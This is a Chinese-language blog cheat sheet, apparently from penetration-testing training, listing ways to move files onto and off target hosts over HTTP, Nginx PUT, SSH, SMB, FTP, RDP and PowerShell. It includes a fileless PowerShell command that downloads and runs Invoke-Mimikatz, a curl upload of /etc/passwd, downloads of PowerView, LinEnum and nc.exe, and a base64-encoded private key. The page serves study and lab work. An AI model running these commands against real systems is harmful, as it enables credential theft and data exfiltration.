<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8">
  <meta http-equiv="pragma" content="no-cache">
  <meta http-equiv="cache-control" content="no-cache">
  <meta http-equiv="expires" content="0">
  
  <title>File Transfer | n2ryx&#39;s Blog</title>
  <meta name="author" content="n2ryx">
  
  <meta name="description" content="WebBasic123456php -S 0.0.0.0:portpython3 -m http.server [port]		# 默认端口为 8000ruby -run -e httpd . [-p port]		# 默认端口为 8080# wget http://ip/file# curl -O http://ip/file

Nginx PUT12sudo mkdir -p /var/www/uploads/SecretUploadDirectorysudo chown -R www-data:www-data /var/www/uploads/SecretUploadDirectory

&amp;#x2F;etc&amp;#x2F;nginx&amp;#x2F;sites-available&amp;#x2F;upload.conf
12345678server &amp;#123;    listen 9001;        location /SecretUploadDirectory/ &amp;#123;        root    /var/www/uploads;        dav_methods PUT;    &amp;#125;&amp;#125;

链接到sites-enabled目录下
1sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/

启动服务"> 
  
  
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

  <meta property="og:title" content="File Transfer"/>
  <meta property="og:site_name" content="n2ryx&#39;s Blog"/>

  
    <meta property="og:image" content=""/>
  

  
    <link rel="alternative" href="/atom.xml" title="n2ryx&#39;s Blog" type="application/atom+xml">
  
  
    <link href="/favicon.png" rel="icon">
  
  
  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->

  <script src="/js/jquery-2.0.3.min.js"></script>

  <!-- analytics -->
  
  <!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-70812759-1"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-70812759-1');
</script>






<meta name="generator" content="Hexo 7.3.0"></head>

 <body>  
  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
    <div class="container">
      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
		<span class="sr-only">Toggle navigation</span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
      </button>
	  <a class="navbar-brand" href="/">n2ryx&#39;s Blog</a>
      <div class="collapse navbar-collapse nav-menu">
		<ul class="nav navbar-nav">
		  
		  <li>
			<a href="/archives" title="All the articles.">
			  <i class="fa fa-archive"></i>Archives
			</a>
		  </li>
		  
		  <li>
			<a href="/categories" title="All the categories.">
			  <i class="fa fa-folder"></i>Categories
			</a>
		  </li>
		  
		  <li>
			<a href="/tags" title="All the tags.">
			  <i class="fa fa-tags"></i>Tags
			</a>
		  </li>
		  
		  <li>
			<a href="/tools" title="All the tools.">
			  <i class="fa fa-terminal"></i>Tools
			</a>
		  </li>
		  
		  <li>
			<a href="/about" title="About me.">
			  <i class="fa fa-user"></i>About
			</a>
		  </li>
		  
		</ul>
      </div>
    </div> <!-- container -->
</nav>
<div class="clearfix"></div>

  <div class="container">
  	<div class="content">
    	 


	
		<div class="page-header">
			<h1> File Transfer</h1>
		</div>
	



<div class="row post">
	<!-- cols -->
	
	<div id="top_meta"></div>
	<div class="col-md-9">
	

	<!-- content -->
	<div class="mypage">		
	  		

	  <h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="Basic"><a href="#Basic" class="headerlink" title="Basic"></a>Basic</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">php -S 0.0.0.0:port</span><br><span class="line">python3 -m http.server [port]		# 默认端口为 8000</span><br><span class="line">ruby -run -e httpd . [-p port]		# 默认端口为 8080</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">wget http://ip/file</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">curl -O http://ip/file</span></span><br></pre></td></tr></table></figure>

<h2 id="Nginx-PUT"><a href="#Nginx-PUT" class="headerlink" title="Nginx PUT"></a>Nginx PUT</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo mkdir -p /var/www/uploads/SecretUploadDirectory</span><br><span class="line">sudo chown -R www-data:www-data /var/www/uploads/SecretUploadDirectory</span><br></pre></td></tr></table></figure>

<p>&#x2F;etc&#x2F;nginx&#x2F;sites-available&#x2F;upload.conf</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen 9001;</span><br><span class="line">    </span><br><span class="line">    location /SecretUploadDirectory/ &#123;</span><br><span class="line">        root    /var/www/uploads;</span><br><span class="line">        dav_methods PUT;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>链接到<code>sites-enabled</code>目录下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/</span><br></pre></td></tr></table></figure>

<p>启动服务</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl restart nginx.service</span><br></pre></td></tr></table></figure>

<p>端口被占用，可删除默认配置文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo rm /etc/nginx/sites-enabled/default</span><br></pre></td></tr></table></figure>

<p>上传文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -T /etc/passwd http://localhost:9001/SecretUploadDirectory/users.txt</span><br></pre></td></tr></table></figure>

<h1 id="ssh"><a href="#ssh" class="headerlink" title="ssh"></a>ssh</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh user@host &quot;cat &gt; /path/to/remote/file&quot; &lt; /path/to/local/file	# 上传</span><br><span class="line">ssh user@host &quot;cat /path/to/remote/file&quot; &gt; /path/to/local/file		# 下载</span><br></pre></td></tr></table></figure>

<h1 id="scp"><a href="#scp" class="headerlink" title="scp"></a>scp</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">scp file1 file2 user@host:/destination	# 上传</span><br><span class="line">scp user@host:/source /destination		# 下载</span><br><span class="line">	-r 递归</span><br><span class="line">	-P 指定端口</span><br><span class="line">	-v 详细信息</span><br><span class="line">	-C 压缩</span><br><span class="line">	-o Compression=no 禁止压缩</span><br></pre></td></tr></table></figure>

<h1 id="Powershell"><a href="#Powershell" class="headerlink" title="Powershell"></a>Powershell</h1><h2 id="Web-Download"><a href="#Web-Download" class="headerlink" title="Web Download"></a>Web Download</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; (<span class="built_in">New-Object</span> Net.WebClient).DownloadFile(<span class="string">&#x27;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1&#x27;</span>,<span class="string">&#x27;C:\Users\Public\Downloads\PowerView.ps1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">PS</span> C:\&gt; (<span class="built_in">New-Object</span> Net.WebClient).DownloadFileAsync(<span class="string">&#x27;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1&#x27;</span>, <span class="string">&#x27;C:\Users\Public\Downloads\PowerViewAsync.ps1&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h2 id="Fileless"><a href="#Fileless" class="headerlink" title="Fileless"></a>Fileless</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">IEX</span> (<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">&#x27;https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># IEX(Invoke-Expression): 执行一个字符串形式的命令或表达式</span></span><br></pre></td></tr></table></figure>

<h2 id="Invoke-WebRequest"><a href="#Invoke-WebRequest" class="headerlink" title="Invoke-WebRequest"></a>Invoke-WebRequest</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Invoke-WebRequest</span> <span class="literal">-Uri</span> https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 <span class="literal">-OutFile</span> PowerView.ps1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 缩写</span></span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">iwr</span> https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 <span class="literal">-o</span> PowerView.ps1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 可能存在 Internet Explorer 首次启动配置尚未完成的情况，导致无法下载。</span></span><br><span class="line"><span class="comment"># 可以使用参数来绕过这个问题-UseBasicParsing.</span></span><br></pre></td></tr></table></figure>

<h2 id="PowerShell-Session"><a href="#PowerShell-Session" class="headerlink" title="PowerShell Session"></a>PowerShell Session</h2><p>PowerShell 远程处理会创建 HTTP 和 HTTPS 侦听器。侦听器在默认端口 TCP&#x2F;5985（对于 HTTP）和 TCP&#x2F;5986（对于 HTTPS）上运行。需要具有管理访问权限、成为<code>Remote Management Users</code>组成员或在会话配置中拥有 PowerShell 远程的明确权限。</p>
<p>target</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看 5985 端口状态</span></span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Test-NetConnection</span> <span class="literal">-ComputerName</span> DATABASE01 <span class="literal">-Port</span> <span class="number">5985</span></span><br><span class="line"></span><br><span class="line">ComputerName     : DATABASE01</span><br><span class="line">RemoteAddress    : <span class="number">192.168</span>.<span class="number">1.101</span></span><br><span class="line">RemotePort       : <span class="number">5985</span></span><br><span class="line">InterfaceAlias   : Ethernet0</span><br><span class="line">SourceAddress    : <span class="number">192.168</span>.<span class="number">1.100</span></span><br><span class="line">TcpTestSucceeded : True</span><br></pre></td></tr></table></figure>

<p>host</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 创建 DATABASE01 远程会话</span></span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="variable">$Session</span> = <span class="built_in">New-PSSession</span> <span class="literal">-ComputerName</span> DATABASE01</span><br><span class="line"></span><br><span class="line"><span class="comment"># 上传</span></span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Copy-Item</span> <span class="literal">-Path</span> C:\samplefile.txt <span class="literal">-ToSession</span> <span class="variable">$Session</span> <span class="literal">-Destination</span> C:\Users\Administrator\Desktop\</span><br><span class="line"></span><br><span class="line"><span class="comment"># 下载</span></span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Copy-Item</span> <span class="literal">-Path</span> <span class="string">&quot;C:\Users\Administrator\Desktop\DATABASE.txt&quot;</span> <span class="literal">-Destination</span> C:\ <span class="literal">-FromSession</span> <span class="variable">$Session</span></span><br></pre></td></tr></table></figure>

<h1 id="Base64"><a href="#Base64" class="headerlink" title="Base64"></a>Base64</h1><h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><p>encode</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">base64 shell -w 0	# -w 0, 不换行</span><br><span class="line">echo &quot;&lt;SNIP&gt;&quot; | base64 -d &gt; shell</span><br></pre></td></tr></table></figure>

<p>decode</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">echo IyBDb3B5cmlnaHQgKGMpIDE5OTMtMjAwOSBNaWNyb3NvZnQgQ29ycC4NCiMNCiMgVGhpcyBpcyBhIHNhbXBsZSBIT1NUUyBmaWxlIHVzZWQgYnkgTWljcm9zb2Z0IFRDUC9JUCBmb3IgV2luZG93cy4NCiMNCiMgVGhpcyBmaWxlIGNvbnRhaW5zIHRoZSBtYXBwaW5ncyBvZiBJUCBhZGRyZXNzZXMgdG8gaG9zdCBuYW1lcy4gRWFjaA0KIyBlbnRyeSBzaG91bGQgYmUga2VwdCBvbiBhbiBpbmRpdmlkdWFsIGxpbmUuIFRoZSBJUCBhZGRyZXNzIHNob3VsZA0KIyBiZSBwbGFjZWQgaW4gdGhlIGZpcnN0IGNvbHVtbiBmb2xsb3dlZCBieSB0aGUgY29ycmVzcG9uZGluZyBob3N0IG5hbWUuDQojIFRoZSBJUCBhZGRyZXNzIGFuZCB0aGUgaG9zdCBuYW1lIHNob3VsZCBiZSBzZXBhcmF0ZWQgYnkgYXQgbGVhc3Qgb25lDQojIHNwYWNlLg0KIw0KIyBBZGRpdGlvbmFsbHksIGNvbW1lbnRzIChzdWNoIGFzIHRoZXNlKSBtYXkgYmUgaW5zZXJ0ZWQgb24gaW5kaXZpZHVhbA0KIyBsaW5lcyBvciBmb2xsb3dpbmcgdGhlIG1hY2hpbmUgbmFtZSBkZW5vdGVkIGJ5IGEgJyMnIHN5bWJvbC4NCiMNCiMgRm9yIGV4YW1wbGU6DQojDQojICAgICAgMTAyLjU0Ljk0Ljk3ICAgICByaGluby5hY21lLmNvbSAgICAgICAgICAjIHNvdXJjZSBzZXJ2ZXINCiMgICAgICAgMzguMjUuNjMuMTAgICAgIHguYWNtZS5jb20gICAgICAgICAgICAgICMgeCBjbGllbnQgaG9zdA0KDQojIGxvY2FsaG9zdCBuYW1lIHJlc29sdXRpb24gaXMgaGFuZGxlZCB3aXRoaW4gRE5TIGl0c2VsZi4NCiMJMTI3LjAuMC4xICAgICAgIGxvY2FsaG9zdA0KIwk6OjEgICAgICAgICAgICAgbG9jYWxob3N0DQo= | base64 -d &gt; hosts</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">md5sum hosts </span><br><span class="line"></span><br><span class="line">3688374325b992def12793500307566d  hosts</span><br></pre></td></tr></table></figure>

<h2 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h2><p>encode</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; [<span class="type">Convert</span>]::ToBase64String((<span class="built_in">Get-Content</span> <span class="literal">-path</span> <span class="string">&quot;C:\Windows\system32\drivers\etc\hosts&quot;</span> <span class="literal">-Encoding</span> byte))</span><br><span class="line"></span><br><span class="line">IyBDb3B5cmlnaHQgKGMpIDE5OTMtMjAwOSBNaWNyb3NvZnQgQ29ycC4NCiMNCiMgVGhpcyBpcyBhIHNhbXBsZSBIT1NUUyBmaWxlIHVzZWQgYnkgTWljcm9zb2Z0IFRDUC9JUCBmb3IgV2luZG93cy4NCiMNCiMgVGhpcyBmaWxlIGNvbnRhaW5zIHRoZSBtYXBwaW5ncyBvZiBJUCBhZGRyZXNzZXMgdG8gaG9zdCBuYW1lcy4gRWFjaA0KIyBlbnRyeSBzaG91bGQgYmUga2VwdCBvbiBhbiBpbmRpdmlkdWFsIGxpbmUuIFRoZSBJUCBhZGRyZXNzIHNob3VsZA0KIyBiZSBwbGFjZWQgaW4gdGhlIGZpcnN0IGNvbHVtbiBmb2xsb3dlZCBieSB0aGUgY29ycmVzcG9uZGluZyBob3N0IG5hbWUuDQojIFRoZSBJUCBhZGRyZXNzIGFuZCB0aGUgaG9zdCBuYW1lIHNob3VsZCBiZSBzZXBhcmF0ZWQgYnkgYXQgbGVhc3Qgb25lDQojIHNwYWNlLg0KIw0KIyBBZGRpdGlvbmFsbHksIGNvbW1lbnRzIChzdWNoIGFzIHRoZXNlKSBtYXkgYmUgaW5zZXJ0ZWQgb24gaW5kaXZpZHVhbA0KIyBsaW5lcyBvciBmb2xsb3dpbmcgdGhlIG1hY2hpbmUgbmFtZSBkZW5vdGVkIGJ5IGEgJyMnIHN5bWJvbC4NCiMNCiMgRm9yIGV4YW1wbGU6DQojDQojICAgICAgMTAyLjU0Ljk0Ljk3ICAgICByaGluby5hY21lLmNvbSAgICAgICAgICAjIHNvdXJjZSBzZXJ2ZXINCiMgICAgICAgMzguMjUuNjMuMTAgICAgIHguYWNtZS5jb20gICAgICAgICAgICAgICMgeCBjbGllbnQgaG9zdA0KDQojIGxvY2FsaG9zdCBuYW1lIHJlc29sdXRpb24gaXMgaGFuZGxlZCB3aXRoaW4gRE5TIGl0c2VsZi4NCiMJMTI3LjAuMC4xICAgICAgIGxvY2FsaG9zdA0KIwk6OjEgICAgICAgICAgICAgbG9jYWxob3N0DQo=</span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Get-FileHash</span> <span class="string">&quot;C:\Windows\system32\drivers\etc\hosts&quot;</span> <span class="literal">-Algorithm</span> MD5 | <span class="built_in">select</span> Hash</span><br><span class="line"></span><br><span class="line">Hash</span><br><span class="line"><span class="literal">----</span></span><br><span class="line"><span class="number">3688374325</span>B992DEF12793500307566D</span><br></pre></td></tr></table></figure>

<p>decode</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; [<span class="type">IO.File</span>]::WriteAllBytes(<span class="string">&quot;C:\Users\Public\id_rsa&quot;</span>, [<span class="type">Convert</span>]::FromBase64String(<span class="string">&quot;LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSkg3Tm9Yai84YXNHRUcxcHpJbmtiN2hIMldRVGpMQWRYZE9kCno3YjJtd0tiSW56VmtTM1BUR3ZseGhDVkRRUmpBYzloQ3k1Q0duWnlLM3U2TjQ3RFhURFY0YUtkcXl0UTFUQXZZUHQwWm8KVWh2bEo5YUgxclgzVHUxM2FRWUNQTVdMc2JOV2tLWFJzSk11dTJONkJoRHVmQThhc0FBQUlRRGJXa3p3MjFwTThBQUFBSApjM05vTFhKellRQUFBSUVBeloxNHc1dTVPZWh0eUlCUEpIN05vWGovOGFzR0VHMXB6SW5rYjdoSDJXUVRqTEFkWGRPZHo3CmIybXdLYkluelZrUzNQVEd2bHhoQ1ZEUVJqQWM5aEN5NUNHblp5SzN1Nk40N0RYVERWNGFLZHF5dFExVEF2WVB0MFpvVWgKdmxKOWFIMXJYM1R1MTNhUVlDUE1XTHNiTldrS1hSc0pNdXUyTjZCaER1ZkE4YXNBQUFBREFRQUJBQUFBZ0NjQ28zRHBVSwpFdCtmWTZjY21JelZhL2NEL1hwTlRsRFZlaktkWVFib0ZPUFc5SjBxaUVoOEpyQWlxeXVlQTNNd1hTWFN3d3BHMkpvOTNPCllVSnNxQXB4NlBxbFF6K3hKNjZEdzl5RWF1RTA5OXpodEtpK0pvMkttVzJzVENkbm92Y3BiK3Q3S2lPcHlwYndFZ0dJWVkKZW9VT2hENVJyY2s5Q3J2TlFBem9BeEFBQUFRUUNGKzBtTXJraklXL09lc3lJRC9JQzJNRGNuNTI0S2NORUZ0NUk5b0ZJMApDcmdYNmNoSlNiVWJsVXFqVEx4NmIyblNmSlVWS3pUMXRCVk1tWEZ4Vit0K0FBQUFRUURzbGZwMnJzVTdtaVMyQnhXWjBNCjY2OEhxblp1SWc3WjVLUnFrK1hqWkdqbHVJMkxjalRKZEd4Z0VBanhuZEJqa0F0MExlOFphbUt5blV2aGU3ekkzL0FBQUEKUVFEZWZPSVFNZnQ0R1NtaERreWJtbG1IQXRkMUdYVitOQTRGNXQ0UExZYzZOYWRIc0JTWDJWN0liaFA1cS9yVm5tVHJRZApaUkVJTW84NzRMUkJrY0FqUlZBQUFBRkhCc1lXbHVkR1Y0ZEVCamVXSmxjbk53WVdObEFRSURCQVVHCi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo=&quot;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Get-FileHash</span> C:\Users\Public\id_rsa <span class="literal">-Algorithm</span> md5</span><br><span class="line"></span><br><span class="line">Algorithm       Hash                                     Path</span><br><span class="line"><span class="literal">---------</span>       <span class="literal">----</span>                                     <span class="literal">----</span></span><br><span class="line">MD5             <span class="number">4</span>E301756A07DED0A2DD6953ABF015278         C:\Users\Public\id_rsa</span><br><span class="line"></span><br><span class="line"><span class="comment"># 注意：虽然这种方法很方便，但并不总是可行的。Windows 命令行实用程序 (cmd.exe) 的最大字符串长度为 8,191 个字符。此外，如果您尝试发送非常大的字符串，Web shell 可能会出错</span></span><br></pre></td></tr></table></figure>

<h1 id="SMB"><a href="#SMB" class="headerlink" title="SMB"></a>SMB</h1><h2 id="Impacket-smbserver"><a href="#Impacket-smbserver" class="headerlink" title="Impacket smbserver"></a>Impacket smbserver</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo impacket-smbserver share -smb2support /tmp/smbshare</span><br><span class="line"># or</span><br><span class="line">sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test</span><br></pre></td></tr></table></figure>

<h2 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h2><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">copy</span> \\192.168.220.133\<span class="title">share</span>\<span class="title">nc.exe</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">C</span>:\&gt; <span class="title">net</span> <span class="title">use</span> <span class="title">n</span>: \\192.168.220.133\<span class="title">share</span> /<span class="title">user:test</span> <span class="title">test</span></span></span><br><span class="line"><span class="function"><span class="title">The</span> <span class="title">command</span> <span class="title">completed</span> <span class="title">successfully</span>.</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">C</span>:\&gt; <span class="title">copy</span> <span class="title">n</span>:\<span class="title">nc.exe</span></span></span><br><span class="line"><span class="function">        1 <span class="title">file</span>(<span class="title">s</span>) <span class="title">copied</span>.</span></span><br></pre></td></tr></table></figure>

<h2 id="Linux-1"><a href="#Linux-1" class="headerlink" title="Linux"></a>Linux</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ smbclient \\\\192.168.220.133\\share -U test%test</span><br><span class="line"></span><br><span class="line">smb: \&gt; recurse ON		# 启用递归模式</span><br><span class="line">smb: \&gt; prompt OFF		# 关闭下载提示</span><br><span class="line">smb: \&gt; mget *</span><br></pre></td></tr></table></figure>

<h1 id="FTP"><a href="#FTP" class="headerlink" title="FTP"></a>FTP</h1><h2 id="Python3-pyftpdlib"><a href="#Python3-pyftpdlib" class="headerlink" title="Python3 pyftpdlib"></a>Python3 pyftpdlib</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m pyftpdlib --port 21</span><br></pre></td></tr></table></figure>

<h3 id="Windows-1"><a href="#Windows-1" class="headerlink" title="Windows"></a>Windows</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; (<span class="built_in">New-Object</span> Net.WebClient).DownloadFile(<span class="string">&#x27;ftp://192.168.49.128/file.txt&#x27;</span>, <span class="string">&#x27;C:\Users\Public\ftp-file.txt&#x27;</span>)</span><br><span class="line"><span class="comment"># or</span></span><br><span class="line">C:\&gt; ftp anonymous@ftp<span class="literal">-server</span></span><br></pre></td></tr></table></figure>

<h3 id="Linux-2"><a href="#Linux-2" class="headerlink" title="Linux"></a>Linux</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ftp anonymous@ftp-server</span><br></pre></td></tr></table></figure>

<h1 id="RDP"><a href="#RDP" class="headerlink" title="RDP"></a>RDP</h1><h2 id="mount-linux-folder"><a href="#mount-linux-folder" class="headerlink" title="mount linux folder"></a>mount linux folder</h2><h3 id="rdesktop"><a href="#rdesktop" class="headerlink" title="rdesktop"></a>rdesktop</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rdesktop 10.10.10.132 -d HTB -u administrator -p &#x27;Password0@&#x27; -r disk:linux=&#x27;/home/user/rdesktop/files&#x27;</span><br></pre></td></tr></table></figure>

<h3 id="xfreerdp"><a href="#xfreerdp" class="headerlink" title="xfreerdp"></a>xfreerdp</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:&#x27;Password0@&#x27; /drive:linux,/home/plaintext/htb/academy/filetransfer</span><br></pre></td></tr></table></figure>

<h3 id="connect"><a href="#connect" class="headerlink" title="connect"></a>connect</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\\client\</span><br></pre></td></tr></table></figure>

<h2 id="mount-windows-folder"><a href="#mount-windows-folder" class="headerlink" title="mount windows folder"></a>mount windows folder</h2><p>Windows 的<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/mstsc">mstsc.exe</a>远程桌面客户端</p>
<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/image-1729603855319.png" alt="rdp"></p>
<h1 id="Language"><a href="#Language" class="headerlink" title="Language"></a>Language</h1><h2 id="python"><a href="#python" class="headerlink" title="python"></a>python</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python2.7 -c &#x27;import urllib;urllib.urlretrieve (&quot;https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh&quot;, &quot;LinEnum.sh&quot;)&#x27;</span><br><span class="line"></span><br><span class="line">python3 -c &#x27;import urllib.request;urllib.request.urlretrieve(&quot;https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh&quot;, &quot;LinEnum.sh&quot;)&#x27;</span><br></pre></td></tr></table></figure>

